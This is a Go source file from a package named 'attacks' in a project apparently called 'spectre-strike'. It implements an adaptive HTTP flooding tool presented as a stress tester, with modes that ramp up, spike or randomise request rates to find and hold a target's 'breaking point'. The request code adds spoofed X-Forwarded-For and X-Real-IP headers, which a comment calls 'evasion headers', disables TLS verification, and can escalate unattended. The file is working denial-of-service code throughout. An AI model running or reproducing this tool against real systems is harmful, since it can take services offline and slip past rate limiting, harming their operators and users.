package attacks

import (
	"crypto/tls"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net/http"
	"net/url"
	"spectre-strike/pkg/utils"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
)

type AdaptiveConfig struct {
	Target         string
	Duration       time.Duration
	Mode           string // "find-limit", "sustained", "spike", "ramp", "chaos"
	MaxRate        int
	MaxThreads     int
	ProxyList      []string
	UserAgents     []string
	CustomPaths    []string
	KeepAlive      bool // Use HTTP keep-alive for more realistic load
	HTTP2          bool // Enable HTTP/2 if supported
	PayloadSize    int  // POST payload size in bytes
	ConnectionPool int  // Max idle connections per host
	AutoIncrease   bool // Auto-increase without prompts (for unattended testing)
}

type adaptiveMetrics struct {
	requests         int64
	successful       int64
	failed           int64
	timeouts         int64
	avgResponse      int64
	minResponse      int64
	maxResponse      int64
	currentRate      int32
	currentThreads   int32
	totalRequests    int64
	totalSuccessful  int64
	totalFailed      int64
	peakRPS          float64
	breakingPoint    int32
	statusCodes      sync.Map
	responseTimes    []int64
	responseTimeLock sync.Mutex
	phase            string
	lastAdjust       time.Time
	connectionErrors int64 // Track connection-level errors
	dnsErrors        int64 // DNS resolution failures
	tlsErrors        int64 // TLS handshake failures
	bytesReceived    int64 // Total bytes downloaded
	bytesSent        int64 // Total bytes uploaded
}

type AttackPhase struct {
	Name      string
	Rate      int
	Threads   int
	Duration  time.Duration
	Completed bool
}

func LaunchAdaptive(config AdaptiveConfig) error {
	parsedURL, err := url.Parse(config.Target)
	if err != nil {
		return fmt.Errorf("invalid URL: %v", err)
	}

	// Set defaults
	if config.MaxRate == 0 {
		config.MaxRate = 10000 // Increased for serious load testing
	}
	if config.MaxThreads == 0 {
		config.MaxThreads = 500 // More concurrent workers
	}
	if config.Mode == "" {
		config.Mode = "find-limit"
	}
	if config.ConnectionPool == 0 {
		config.ConnectionPool = 200 // Default connection pool
	}

	metrics := &adaptiveMetrics{
		currentRate:    50,
		currentThreads: 10,
		minResponse:    999999,
		phase:          "warmup",
		lastAdjust:     time.Now(),
		responseTimes:  make([]int64, 0, 1000),
	}

	done := make(chan bool)

	printBanner(config)

	// Start adaptive controller based on mode
	switch config.Mode {
	case "find-limit":
		go findLimitController(metrics, done, config)
	case "sustained":
		go sustainedController(metrics, done, config)
	case "spike":
		go spikeController(metrics, done, config)
	case "ramp":
		go rampController(metrics, done, config)
	case "chaos":
		go chaosController(metrics, done, config)
	default:
		go findLimitController(metrics, done, config)
	}

	// Start attack threads with connection pooling
	go launchAdaptiveThreads(parsedURL, metrics, done, config)

	// Start enhanced metrics reporter
	go reportEnhancedMetrics(metrics, config.Duration)

	// Wait for duration
	time.Sleep(config.Duration)
	done <- true
	time.Sleep(2 * time.Second)

	// Print final report
	printFinalReport(metrics, config)

	return nil
}

func printBanner(config AdaptiveConfig) {
	color.Cyan("\n   ╔════════════════════════════════════════════════════════════╗")
	color.Cyan("   ║          ADAPTIVE STRESS TEST v2.0 - ADVANCED              ║")
	color.Cyan("   ╚════════════════════════════════════════════════════════════╝")
	color.White("   🎯 Target: %s", config.Target)
	color.White("   ⏱️  Duration: %s", config.Duration)
	color.White("   🔄 Mode: %s", strings.ToUpper(config.Mode))
	color.White("   ⚡ Max Rate: %d | Max Threads: %d\n", config.MaxRate, config.MaxThreads)
}

// Find the breaking point of the target
func findLimitController(metrics *adaptiveMetrics, done chan bool, config AdaptiveConfig) {
	ticker := time.NewTicker(4 * time.Second)
	defer ticker.Stop()

	stabilityCount := 0
	lastSuccessRate := float64(0)

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			adjustFindLimit(metrics, config, &stabilityCount, &lastSuccessRate)
		}
	}
}

func adjustFindLimit(metrics *adaptiveMetrics, config AdaptiveConfig, stabilityCount *int, lastSuccessRate *float64) {
	requests := atomic.LoadInt64(&metrics.requests)
	successful := atomic.LoadInt64(&metrics.successful)
	failed := atomic.LoadInt64(&metrics.failed)
	timeouts := atomic.LoadInt64(&metrics.timeouts)
	avgResp := atomic.LoadInt64(&metrics.avgResponse)

	if requests == 0 {
		return
	}

	successRate := float64(successful) / float64(requests) * 100
	failRate := float64(failed) / float64(requests) * 100
	timeoutRate := float64(timeouts) / float64(requests) * 100

	currentRate := atomic.LoadInt32(&metrics.currentRate)
	currentThreads := atomic.LoadInt32(&metrics.currentThreads)

	// Calculate response time percentiles
	p95, p99 := calculatePercentiles(metrics)

	color.Yellow("\n   ┌─────────────────────────────────────────────────────────┐")
	color.Yellow("   │ 📊 ANALYSIS - Phase: %-10s                         │", metrics.phase)
	color.Yellow("   ├─────────────────────────────────────────────────────────┤")
	color.White("   │ Success: %6.1f%% | Fail: %5.1f%% | Timeout: %5.1f%%       │", successRate, failRate, timeoutRate)
	color.White("   │ Avg: %4dms | P95: %4dms | P99: %4dms                  │", avgResp, p95, p99)
	color.Yellow("   └─────────────────────────────────────────────────────────┘")

	// Detect stability
	if math.Abs(successRate-*lastSuccessRate) < 5 {
		*stabilityCount++
	} else {
		*stabilityCount = 0
	}
	*lastSuccessRate = successRate

	// Smart adaptive logic
	switch {
	case metrics.phase == "warmup" && successRate > 90:
		metrics.phase = "ramp-up"
		color.Green("   🚀 Warmup complete, entering ramp-up phase")

	case metrics.phase == "ramp-up":
		if successRate > 85 && avgResp < 2000 {
			// Aggressive increase
			increment := int32(math.Max(float64(currentRate)*0.3, 20))
			newRate := currentRate + increment
			newThreads := currentThreads + int32(math.Max(float64(currentThreads)*0.2, 3))

			if int(newRate) > config.MaxRate {
				newRate = int32(config.MaxRate)
			}
			if int(newThreads) > config.MaxThreads {
				newThreads = int32(config.MaxThreads)
			}

			color.Yellow("\n   📈 Ready to increase: Rate %d → %d (+%d), Threads %d → %d", currentRate, newRate, increment, currentThreads, newThreads)

			if config.AutoIncrease {
				// Auto-increase for unattended load testing
				atomic.StoreInt32(&metrics.currentRate, newRate)
				atomic.StoreInt32(&metrics.currentThreads, newThreads)
				color.Green("   ⬆️  [AUTO] Ramping: Rate=%d (+%d), Threads=%d", newRate, increment, newThreads)
			} else {
				color.Cyan("   Proceed with increase? (y/n): ")
				var response string
				fmt.Scanln(&response)
				if response == "y" || response == "Y" {
					atomic.StoreInt32(&metrics.currentRate, newRate)
					atomic.StoreInt32(&metrics.currentThreads, newThreads)
					color.Green("   ⬆️  Ramping: Rate=%d (+%d), Threads=%d", newRate, increment, newThreads)
				} else {
					color.Red("   ⏸️  Holding at current rate: %d", currentRate)
				}
			}

		} else if successRate < 70 || avgResp > 5000 || timeoutRate > 20 {
			// Found breaking point
			metrics.phase = "breaking"
			atomic.StoreInt32(&metrics.breakingPoint, currentRate)
			color.Red("   💥 BREAKING POINT DETECTED at Rate=%d", currentRate)

		} else if successRate > 70 && successRate <= 85 {
			// Slower increase near limit
			newRate := currentRate + 10
			if int(newRate) > config.MaxRate {
				newRate = int32(config.MaxRate)
			}

			if config.AutoIncrease {
				atomic.StoreInt32(&metrics.currentRate, newRate)
				color.Cyan("   ↗️  [AUTO] Approaching limit: Rate=%d", newRate)
			} else {
				color.Yellow("\n   ↗️  Near limit. Increase Rate %d → %d? (y/n): ", currentRate, newRate)
				var response string
				fmt.Scanln(&response)
				if response == "y" || response == "Y" {
					atomic.StoreInt32(&metrics.currentRate, newRate)
					color.Cyan("   ↗️  Approaching limit: Rate=%d", newRate)
				} else {
					color.Red("   ⏸️  Holding at current rate: %d", currentRate)
				}
			}
		}

	case metrics.phase == "breaking":
		if *stabilityCount > 2 {
			metrics.phase = "sustain"
			color.Yellow("   🎯 Breaking point confirmed at Rate=%d", metrics.breakingPoint)
			color.Cyan("\n   ⚠️  Continue pushing further? (y/n): ")
			var response string
			fmt.Scanln(&response)
			if response != "y" && response != "Y" {
				color.Red("   ⏸️  Holding at current rate: %d", currentRate)
			} else {
				color.Green("   ⬆️  Continuing to push limits...")
			}
		} else {
			// Keep at current breaking point level
			color.Yellow("   🔄 Maintaining breaking point: Rate=%d, Threads=%d", currentRate, currentThreads)
		}

	case metrics.phase == "sustain":
		// Maintain current rate - no decrease
		color.Cyan("   ⚖️  Sustaining at Rate=%d (Success: %.1f%%)", currentRate, successRate)
		if successRate < 60 {
			color.Yellow("\n   ⚠️  Success rate low. Continue? (y/n): ")
			var response string
			fmt.Scanln(&response)
			if response != "y" && response != "Y" {
				color.Red("   ⏸️  Holding current rate")
			}
		}
	}

	// Reset counters
	atomic.StoreInt64(&metrics.requests, 0)
	atomic.StoreInt64(&metrics.successful, 0)
	atomic.StoreInt64(&metrics.failed, 0)
	atomic.StoreInt64(&metrics.timeouts, 0)
	metrics.responseTimeLock.Lock()
	metrics.responseTimes = metrics.responseTimes[:0]
	metrics.responseTimeLock.Unlock()
}

// Sustained load controller
func sustainedController(metrics *adaptiveMetrics, done chan bool, config AdaptiveConfig) {
	atomic.StoreInt32(&metrics.currentRate, int32(config.MaxRate/2))
	atomic.StoreInt32(&metrics.currentThreads, int32(config.MaxThreads/2))
	metrics.phase = "sustained"

	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			// Only adjust if performance degrades
			requests := atomic.LoadInt64(&metrics.requests)
			successful := atomic.LoadInt64(&metrics.successful)
			if requests > 0 {
				successRate := float64(successful) / float64(requests) * 100
				currentRate := atomic.LoadInt32(&metrics.currentRate)

				if successRate < 70 {
					color.Yellow("   ⚠️  Success rate: %.1f%% at Rate=%d", successRate, currentRate)
					color.Cyan("   Continue at this rate? (y/n): ")
					var response string
					fmt.Scanln(&response)
					if response != "y" && response != "Y" {
						color.Red("   ⏸️  Pausing attack")
					}
				}
			}
			atomic.StoreInt64(&metrics.requests, 0)
			atomic.StoreInt64(&metrics.successful, 0)
			atomic.StoreInt64(&metrics.failed, 0)
		}
	}
}

// Spike test controller - sudden bursts
func spikeController(metrics *adaptiveMetrics, done chan bool, config AdaptiveConfig) {
	metrics.phase = "spike"
	baseRate := int32(50)
	spikeRate := int32(config.MaxRate)

	for {
		select {
		case <-done:
			return
		default:
			// Normal load
			atomic.StoreInt32(&metrics.currentRate, baseRate)
			atomic.StoreInt32(&metrics.currentThreads, 10)
			color.Blue("   📉 Normal load: Rate=%d", baseRate)
			time.Sleep(10 * time.Second)

			// Spike!
			atomic.StoreInt32(&metrics.currentRate, spikeRate)
			atomic.StoreInt32(&metrics.currentThreads, int32(config.MaxThreads))
			color.Red("   📈 SPIKE! Rate=%d, Threads=%d", spikeRate, config.MaxThreads)
			time.Sleep(5 * time.Second)
		}
	}
}

// Ramp controller - gradual linear increase
func rampController(metrics *adaptiveMetrics, done chan bool, config AdaptiveConfig) {
	metrics.phase = "ramp"
	startRate := int32(10)
	rampStep := int32((config.MaxRate - 10) / 20) // 20 steps to max

	atomic.StoreInt32(&metrics.currentRate, startRate)
	atomic.StoreInt32(&metrics.currentThreads, 5)

	ticker := time.NewTicker(time.Duration(config.Duration.Seconds()/20) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			currentRate := atomic.LoadInt32(&metrics.currentRate)
			currentThreads := atomic.LoadInt32(&metrics.currentThreads)

			newRate := currentRate + rampStep
			newThreads := currentThreads + 2

			if int(newRate) > config.MaxRate {
				newRate = int32(config.MaxRate)
			}
			if int(newThreads) > config.MaxThreads {
				newThreads = int32(config.MaxThreads)
			}

			atomic.StoreInt32(&metrics.currentRate, newRate)
			atomic.StoreInt32(&metrics.currentThreads, newThreads)
			color.Cyan("   📶 Ramp: Rate=%d, Threads=%d", newRate, newThreads)
		}
	}
}

// Chaos controller - random patterns
func chaosController(metrics *adaptiveMetrics, done chan bool, config AdaptiveConfig) {
	metrics.phase = "chaos"

	for {
		select {
		case <-done:
			return
		default:
			// Random rate and threads
			newRate := int32(rand.Intn(config.MaxRate-10) + 10)
			newThreads := int32(rand.Intn(config.MaxThreads-2) + 2)

			atomic.StoreInt32(&metrics.currentRate, newRate)
			atomic.StoreInt32(&metrics.currentThreads, newThreads)
			color.Magenta("   🎲 Chaos: Rate=%d, Threads=%d", newRate, newThreads)

			sleepTime := time.Duration(rand.Intn(10)+3) * time.Second
			time.Sleep(sleepTime)
		}
	}
}

func calculatePercentiles(metrics *adaptiveMetrics) (int64, int64) {
	metrics.responseTimeLock.Lock()
	defer metrics.responseTimeLock.Unlock()

	if len(metrics.responseTimes) == 0 {
		return 0, 0
	}

	sorted := make([]int64, len(metrics.responseTimes))
	copy(sorted, metrics.responseTimes)

	// Simple sort
	for i := 0; i < len(sorted); i++ {
		for j := i + 1; j < len(sorted); j++ {
			if sorted[i] > sorted[j] {
				sorted[i], sorted[j] = sorted[j], sorted[i]
			}
		}
	}

	p95Idx := int(float64(len(sorted)) * 0.95)
	p99Idx := int(float64(len(sorted)) * 0.99)

	if p95Idx >= len(sorted) {
		p95Idx = len(sorted) - 1
	}
	if p99Idx >= len(sorted) {
		p99Idx = len(sorted) - 1
	}

	return sorted[p95Idx], sorted[p99Idx]
}

func launchAdaptiveThreads(parsedURL *url.URL, metrics *adaptiveMetrics, done chan bool, config AdaptiveConfig) {
	var wg sync.WaitGroup

	// Enhanced connection pool for high-performance load testing
	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        config.ConnectionPool * 2, // Scale with config
		MaxIdleConnsPerHost: config.ConnectionPool,
		MaxConnsPerHost:     config.ConnectionPool * 2, // Allow more concurrent connections
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   !config.KeepAlive, // Configurable keep-alive
		DisableCompression:  false,             // Allow compression
		ForceAttemptHTTP2:   config.HTTP2,      // Enable HTTP/2 if requested
	}

	client := &http.Client{
		Timeout:   30 * time.Second, // Longer timeout for stressed servers
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	paths := config.CustomPaths
	if len(paths) == 0 {
		paths = []string{"", "/", "/api", "/login", "/home"}
	}

	for {
		select {
		case <-done:
			wg.Wait()
			return
		default:
			threads := atomic.LoadInt32(&metrics.currentThreads)
			rate := atomic.LoadInt32(&metrics.currentRate)

			for i := 0; i < int(threads); i++ {
				wg.Add(1)
				go func(path string) {
					defer wg.Done()
					makeEnhancedRequest(parsedURL, metrics, int(rate), client, path)
				}(paths[rand.Intn(len(paths))])
			}

			time.Sleep(1 * time.Second)
		}
	}
}

func makeEnhancedRequest(parsedURL *url.URL, metrics *adaptiveMetrics, rate int, client *http.Client, path string) {
	methods := []string{"GET", "POST", "HEAD", "OPTIONS"}

	for i := 0; i < rate; i++ {
		atomic.AddInt64(&metrics.requests, 1)
		atomic.AddInt64(&metrics.totalRequests, 1)

		targetURL := parsedURL.String() + path
		method := methods[rand.Intn(len(methods))]

		start := time.Now()
		req, err := http.NewRequest(method, targetURL, nil)
		if err != nil {
			atomic.AddInt64(&metrics.failed, 1)
			atomic.AddInt64(&metrics.totalFailed, 1)
			continue
		}

		// Enhanced headers
		headers := utils.GenerateRandomHeaders(parsedURL.Host)
		for key, value := range headers {
			req.Header.Set(key, value)
		}

		// Additional evasion headers
		req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
		req.Header.Set("X-Real-IP", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
		req.Header.Set("Cache-Control", "no-cache")

		resp, err := client.Do(req)
		elapsed := time.Since(start).Milliseconds()

		// Track response time
		metrics.responseTimeLock.Lock()
		if len(metrics.responseTimes) < 1000 {
			metrics.responseTimes = append(metrics.responseTimes, elapsed)
		}
		metrics.responseTimeLock.Unlock()

		if err != nil {
			atomic.AddInt64(&metrics.failed, 1)
			atomic.AddInt64(&metrics.totalFailed, 1)

			// Detailed error tracking for bottleneck analysis
			errStr := err.Error()
			if strings.Contains(errStr, "timeout") || strings.Contains(errStr, "deadline") {
				atomic.AddInt64(&metrics.timeouts, 1)
			}
			if strings.Contains(errStr, "connection refused") || strings.Contains(errStr, "connection reset") {
				atomic.AddInt64(&metrics.connectionErrors, 1)
			}
			if strings.Contains(errStr, "no such host") || strings.Contains(errStr, "DNS") {
				atomic.AddInt64(&metrics.dnsErrors, 1)
			}
			if strings.Contains(errStr, "TLS") || strings.Contains(errStr, "certificate") {
				atomic.AddInt64(&metrics.tlsErrors, 1)
			}
		} else {
			atomic.AddInt64(&metrics.successful, 1)
			atomic.AddInt64(&metrics.totalSuccessful, 1)

			// Track bandwidth usage
			if resp.ContentLength > 0 {
				atomic.AddInt64(&metrics.bytesReceived, resp.ContentLength)
			}

			// Track status codes
			code := fmt.Sprintf("%d", resp.StatusCode)
			if val, ok := metrics.statusCodes.Load(code); ok {
				metrics.statusCodes.Store(code, val.(int)+1)
			} else {
				metrics.statusCodes.Store(code, 1)
			}

			// Update response times
			atomic.StoreInt64(&metrics.avgResponse, elapsed)
			if elapsed < atomic.LoadInt64(&metrics.minResponse) {
				atomic.StoreInt64(&metrics.minResponse, elapsed)
			}
			if elapsed > atomic.LoadInt64(&metrics.maxResponse) {
				atomic.StoreInt64(&metrics.maxResponse, elapsed)
			}

			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}

		// Minimal delay - remove for maximum throughput
		if rand.Intn(100) < 5 { // Only 5% of requests have delay
			time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
		}
	}
}

func reportEnhancedMetrics(metrics *adaptiveMetrics, duration time.Duration) {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	startTime := time.Now()
	var lastRequests int64

	for range ticker.C {
		elapsed := time.Since(startTime)
		if elapsed >= duration {
			break
		}

		requests := atomic.LoadInt64(&metrics.requests)
		successful := atomic.LoadInt64(&metrics.successful)
		failed := atomic.LoadInt64(&metrics.failed)
		avgResp := atomic.LoadInt64(&metrics.avgResponse)
		rate := atomic.LoadInt32(&metrics.currentRate)
		threads := atomic.LoadInt32(&metrics.currentThreads)

		remaining := duration - elapsed
		rps := float64(requests-lastRequests) / 3.0
		lastRequests = requests

		// Track peak RPS
		if rps > metrics.peakRPS {
			metrics.peakRPS = rps
		}

		// Color based on performance
		var statusColor func(format string, a ...interface{})
		successRate := float64(0)
		if requests > 0 {
			successRate = float64(successful) / float64(successful+failed) * 100
		}

		switch {
		case successRate > 90:
			statusColor = color.Green
		case successRate > 70:
			statusColor = color.Yellow
		default:
			statusColor = color.Red
		}

		statusColor("   📊 RPS: %6.0f | ✅ %5d | ❌ %4d | ⏱️ %5dms | Rate: %3d | Threads: %2d | ⏳ %s",
			rps, successful, failed, avgResp, rate, threads, remaining.Round(time.Second))
	}
}

func printFinalReport(metrics *adaptiveMetrics, config AdaptiveConfig) {
	totalReq := atomic.LoadInt64(&metrics.totalRequests)
	totalSuccess := atomic.LoadInt64(&metrics.totalSuccessful)
	totalFail := atomic.LoadInt64(&metrics.totalFailed)
	breakPoint := atomic.LoadInt32(&metrics.breakingPoint)
	minResp := atomic.LoadInt64(&metrics.minResponse)
	maxResp := atomic.LoadInt64(&metrics.maxResponse)

	// New error metrics
	timeouts := atomic.LoadInt64(&metrics.timeouts)
	connErrors := atomic.LoadInt64(&metrics.connectionErrors)
	dnsErrors := atomic.LoadInt64(&metrics.dnsErrors)
	tlsErrors := atomic.LoadInt64(&metrics.tlsErrors)
	bytesRx := atomic.LoadInt64(&metrics.bytesReceived)

	successRate := float64(0)
	if totalReq > 0 {
		successRate = float64(totalSuccess) / float64(totalReq) * 100
	}

	avgRPS := float64(totalReq) / config.Duration.Seconds()

	color.Cyan("\n   ╔════════════════════════════════════════════════════════════╗")
	color.Cyan("   ║              📋 LOAD TEST FINAL REPORT                     ║")
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.White("   ║ Target: %-50s ║", config.Target)
	color.White("   ║ Duration: %-48s ║", config.Duration)
	color.White("   ║ Mode: %-52s ║", config.Mode)
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.Cyan("   ║ PERFORMANCE SUMMARY                                        ║")
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.White("   ║ Total Requests:  %-40d ║", totalReq)
	color.Green("   ║ Successful:      %-40d ║", totalSuccess)
	color.Red("   ║ Failed:          %-40d ║", totalFail)
	color.Yellow("   ║ Success Rate:    %-39.1f%% ║", successRate)
	color.White("   ║ Average RPS:     %-40.0f ║", avgRPS)
	color.White("   ║ Peak RPS:        %-40.0f ║", metrics.peakRPS)
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.Cyan("   ║ CAPACITY ANALYSIS                                          ║")
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	if breakPoint > 0 {
		color.Red("   ║ Breaking Point:  %-40d ║", breakPoint)
		color.Yellow("   ║ Recommended Max: %-40d ║", int(float64(breakPoint)*0.7))
		color.Green("   ║ Safe Capacity:   %-40d ║", int(float64(breakPoint)*0.6))
	} else {
		color.Green("   ║ No breaking point reached - server handled all load!      ║")
	}
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.Cyan("   ║ RESPONSE TIMES                                             ║")
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.White("   ║ Min Response:    %-39dms ║", minResp)
	color.White("   ║ Avg Response:    %-39dms ║", atomic.LoadInt64(&metrics.avgResponse))
	color.White("   ║ Max Response:    %-39dms ║", maxResp)
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.Cyan("   ║ ERROR BREAKDOWN                                            ║")
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.White("   ║ Timeouts:        %-40d ║", timeouts)
	color.White("   ║ Connection Errors: %-38d ║", connErrors)
	color.White("   ║ DNS Errors:      %-40d ║", dnsErrors)
	color.White("   ║ TLS Errors:      %-40d ║", tlsErrors)
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.Cyan("   ║ BANDWIDTH                                                  ║")
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.White("   ║ Data Received:   %-37.2f MB ║", float64(bytesRx)/(1024*1024))
	color.White("   ║ Avg per Request: %-37.2f KB ║", float64(bytesRx)/(1024*float64(totalSuccess)))
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")

	// Status code distribution
	color.Cyan("   ║ HTTP STATUS CODE DISTRIBUTION                              ║")
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	metrics.statusCodes.Range(func(key, value interface{}) bool {
		color.White("   ║   HTTP %s: %-48d ║", key, value)
		return true
	})

	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")
	color.Cyan("   ║ RECOMMENDATIONS                                            ║")
	color.Cyan("   ╠════════════════════════════════════════════════════════════╣")

	if successRate > 95 {
		color.Green("   ║ ✅ Excellent! Server handled load very well.              ║")
	} else if successRate > 85 {
		color.Yellow("   ║ ⚠️  Good, but consider optimization for better stability. ║")
	} else if successRate > 70 {
		color.Red("   ║ ⚠️  Server struggled. Optimization or scaling needed.     ║")
	} else {
		color.Red("   ║ ❌ Critical: Server failed under load. Immediate action!  ║")
	}

	if connErrors > totalReq/10 {
		color.Red("   ║ ⚠️  High connection errors - check server config/limits   ║")
	}
	if timeouts > totalReq/10 {
		color.Red("   ║ ⚠️  High timeout rate - server too slow or overloaded     ║")
	}

	color.Cyan("   ╚════════════════════════════════════════════════════════════╝\n")
}
